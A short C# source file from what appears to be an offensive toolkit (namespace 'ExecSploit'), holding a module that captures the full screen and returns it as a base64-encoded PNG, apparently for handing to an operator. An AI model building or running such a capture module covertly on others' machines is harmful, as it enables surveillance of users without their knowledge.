using System;
using System.IO;
using System.Text;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
using System.Management.Automation.Host;

namespace ExecSploit
{
    public static class ScreenShot
    {
        public static string Execute()
        {
            try
            {
                System.Drawing.Rectangle bounds = Screen.GetBounds(Point.Empty);
                using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                {
                    using (Graphics g = Graphics.FromImage(bitmap))
                    {
                        g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                    }
                    MemoryStream ms = new MemoryStream();
                    bitmap.Save(ms, ImageFormat.Png);
                    byte[] bmpBytes = ms.ToArray();
                    return Convert.ToBase64String(bmpBytes);
                }
            }
            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
        }
    }
}